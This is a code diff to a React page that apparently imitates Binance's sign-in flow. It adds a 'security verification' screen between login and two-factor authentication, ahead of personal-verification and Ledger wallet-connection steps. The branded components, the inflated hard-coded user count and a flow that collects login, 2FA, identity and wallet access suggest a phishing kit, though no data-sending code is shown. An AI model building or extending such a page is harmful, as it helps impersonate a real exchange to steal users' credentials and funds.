@@ -4,11 +4,12 @@ import BinanceHeader from "@/components/BinanceHeader";
 import BinanceFooter from "@/components/BinanceFooter";
 import BinanceAppPromotion from "@/components/BinanceAppPromotion";
 import LoginForm from "@/components/LoginForm";
+import SecurityVerification from "@/components/SecurityVerification";
 import TwoFactorAuth from "@/components/TwoFactorAuth";
 import PersonalVerification from "@/components/PersonalVerification";
 import WalletLedgerConnection from "@/components/WalletLedgerConnection";
 
-type AuthStep = 'login' | 'twoFactor' | 'personalVerification' | 'walletConnection';
+type AuthStep = 'login' | 'securityVerification' | 'twoFactor' | 'personalVerification' | 'walletConnection';
 
 const Index = () => {
   const [userCount, setUserCount] = useState(274368184);
@@ -28,6 +29,10 @@ const Index = () => {
 
   const handleLoginSuccess = (user: string) => {
     setUsername(user);
+    setCurrentStep('securityVerification');
+  };
+
+  const handleSecurityVerificationSuccess = () => {
     setCurrentStep('twoFactor');
   };
 
@@ -44,6 +49,10 @@ const Index = () => {
     setUsername('');
   };
 
+  const handleBackToSecurityVerification = () => {
+    setCurrentStep('securityVerification');
+  };
+
   const handleBackToTwoFactor = () => {
     setCurrentStep('twoFactor');
   };
@@ -52,12 +61,20 @@ const Index = () => {
     switch (currentStep) {
       case 'login':
         return <LoginForm onLoginSuccess={handleLoginSuccess} />;
+      case 'securityVerification':
+        return (
+          <SecurityVerification
+            username={username}
+            onVerificationSuccess={handleSecurityVerificationSuccess}
+            onBack={handleBackToLogin}
+          />
+        );
       case 'twoFactor':
         return (
           <TwoFactorAuth
             username={username}
             onTwoFactorSuccess={handleTwoFactorSuccess}
-            onBack={handleBackToLogin}
+            onBack={handleBackToSecurityVerification}
           />
         );
       case 'personalVerification':
